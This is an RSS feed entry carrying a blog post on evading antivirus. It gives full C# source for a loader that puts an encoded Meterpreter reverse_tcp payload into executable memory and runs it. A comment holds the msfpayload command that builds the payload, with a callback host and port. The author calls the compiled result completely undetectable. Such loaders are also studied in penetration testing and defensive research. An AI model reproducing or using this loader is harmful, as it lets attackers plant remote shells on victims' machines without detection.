<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Shellcode on Matt Andreko</title>
    <link>https://www.mattandreko.com/categories/shellcode/index.xml</link>
    <description>Recent content in Shellcode on Matt Andreko</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-US</language>
    <atom:link href="https://www.mattandreko.com/categories/shellcode/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Using .net to bypass AV</title>
      <link>https://www.mattandreko.com/2012/02/23/using-.net-to-bypass-av/</link>
      <pubDate>Thu, 23 Feb 2012 18:19:00 -0500</pubDate>
      
      <guid>https://www.mattandreko.com/2012/02/23/using-.net-to-bypass-av/</guid>
      <description>&lt;p&gt;I&amp;rsquo;ve read a ton of articles on bypassing Antivirus software when trying to run shellcode on machines.  There&amp;rsquo;s just a ton available.  These are just a few examples:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://dev.metasploit.com/redmine/projects/framework/wiki/Using_a_Custom_Executable_to_Bypass_AV&#34;&gt;http://dev.metasploit.com/redmine/projects/framework/wiki/Using_a_Custom_Executable_to_Bypass_AV&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.offensive-security.com/metasploit-unleashed/Antivirus_Bypass&#34;&gt;http://www.offensive-security.com/metasploit-unleashed/Antivirus_Bypass&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.irongeek.com/i.php?page=videos/bypassing-anti-virus-with-metasploit&#34;&gt;http://www.irongeek.com/i.php?page=videos/bypassing-anti-virus-with-metasploit&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://clshack.com/metasploit-shellcodeexec-bypassing-any-anti-virus.html&#34;&gt;http://clshack.com/metasploit-shellcodeexec-bypassing-any-anti-virus.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://carnal0wnage.attackresearch.com/2011/07/process-injection-outside-of-metasploit.html&#34;&gt;http://carnal0wnage.attackresearch.com/2011/07/process-injection-outside-of-metasploit.html&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I was recently working with some Windows web-servers, which had ASP.net enabled, but not any other useful language.  I had recently read about &lt;a href=&#34;http://www.exploit-monday.com/2011/11/powersyringe-powershell-based-codedll.html&#34;&gt;PowerSyringe&lt;/a&gt;, so I started tinkering with making some shellcode run similarly.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;I ended up finding out that I couldn&amp;rsquo;t do what I was wanting to do in ASP.net as of yet.  If someone else can find a way, please let me know.  Unfortunately, I get the error, &amp;ldquo;Attempted to read or write protected memory. This is often an indication that other memory is corrupt.&amp;rdquo;, when trying to use this in ASP.net.&lt;/p&gt;

&lt;p&gt;However, for just normal Windows applications, this is yet another great way to hide from AV.  It&amp;rsquo;s very similar to the python method, where you wrap the payload in python, and then turn it into an executable.  Take a look, and let me know of any improvements:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;using System;
using System.Runtime.InteropServices;

namespace Wrapper
{
    class Program
    {
        [Flags]
        public enum AllocationType : uint
        {
            COMMIT = 0x1000,
            RESERVE = 0x2000,
            RESET = 0x80000,
            LARGE_PAGES = 0x20000000,
            PHYSICAL = 0x400000,
            TOP_DOWN = 0x100000,
            WRITE_WATCH = 0x200000
        }

        [Flags]
        public enum MemoryProtection : uint
        {
            EXECUTE = 0x10,
            EXECUTE_READ = 0x20,
            EXECUTE_READWRITE = 0x40,
            EXECUTE_WRITECOPY = 0x80,
            NOACCESS = 0x01,
            READONLY = 0x02,
            READWRITE = 0x04,
            WRITECOPY = 0x08,
            GUARD_Modifierflag = 0x100,
            NOCACHE_Modifierflag = 0x200,
            WRITECOMBINE_Modifierflag = 0x400
        }

        public enum FreeType : uint
        {
            MEM_DECOMMIT = 0x4000,
            MEM_RELEASE = 0x8000
        }

        [DllImport(&amp;quot;kernel32.dll&amp;quot;, SetLastError = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

        [DllImport(&amp;quot;kernel32.dll&amp;quot;)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport(&amp;quot;kernel32&amp;quot;)]
        private static extern bool VirtualFree(IntPtr lpAddress, UInt32 dwSize, FreeType dwFreeType);

        [UnmanagedFunctionPointerAttribute(CallingConvention.Cdecl)]
        public delegate Int32 ExecuteDelegate();

        static void Main()
        {
            // msfpayload windows/meterpreter/reverse_tcp EXITFUNC=thread LPORT=4444 LHOST=192.168.1.105 R| msfencode -a x86 -e x86/alpha_mixed -t raw BufferRegister=EAX
            string shellcode = &amp;quot;PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIilkXK9ePePc0qpK9HeUazrU4NkrrtplKPRfllK3bdTlKsBExvoOG3zfFP1YovQyPLl5lpaCL7rDl5pzaZofmUQo7KRzPrrrwLKv2vpnkrbUleQJplKspt8K5IPt4rjs1XPf0nkpH5HLKf8gPvaxSHc5l0IlKTtlKGqzv6QyoFQIPLlzajoTMgqxGuh9pRUzTwsQmzXEkametd5kRQHNkchetGqxSRFlK4LbklK2x7lva9ClKS4lKgqXPNiG4VD6DskCkE169sjV1IoM0bxcobznkDRhkK6smbH03drEPC0qx0wRSEbsobtbH2ld7a6UW9oIEMhlPuQePePuyo4RtbpaxTik0BKc09oHUBp2pf060CpBpSpBpphxjtOkoM0YoKenwQzWurHKpMxfau9sXgr30vqClmYZF3ZTPBvqGCXj9lept3QKOZuouo0Pt6lYobns8SEHlbHxpX5Y21FKON53ZC0SZVdbvCgu8s2n9jhsoKOn5Nk6VSZCpE8S0b0C05PPVcZ30e82xLd1CiukOjuNsScCZUP1F0SV7U84BJyhH1OyoN5wqIStiHFMU9fD5hlYSAA&amp;quot;;

            byte[] sc = new byte[shellcode.Length];

            for (int i = 0; i &amp;lt; shellcode.Length; i++)
            {
                sc[i] = Convert.ToByte(shellcode[i]);
            }

            // Allocate RWX memory for the shellcode
            IntPtr baseAddr = VirtualAlloc(IntPtr.Zero, (UIntPtr)(sc.Length + 1), AllocationType.RESERVE | AllocationType.COMMIT, MemoryProtection.EXECUTE_READWRITE);
            System.Diagnostics.Debug.Assert(baseAddr != IntPtr.Zero, &amp;quot;Error: Couldn&#39;t allocate remote memory&amp;quot;);

            try
            {
                // Copy shellcode to RWX buffer
                Marshal.Copy(sc, 0, baseAddr, sc.Length);

                // Get pointer to function created in memory
                ExecuteDelegate del = (ExecuteDelegate)Marshal.GetDelegateForFunctionPointer(baseAddr, typeof(ExecuteDelegate));

                del();
            }
            finally
            {
                VirtualFree(baseAddr, 0, FreeType.MEM_RELEASE);
            }

            Console.ReadLine();
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Once this is compiled, it seems to currently be completely undetectable.

&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/virustotal_wrapper.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;&lt;b&gt;Update:&lt;/b&gt;Due to several questions, I have uploaded this to &lt;a href=&#34;https://github.com/mandreko/DotNetAVBypass&#34;&gt;GitHub&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>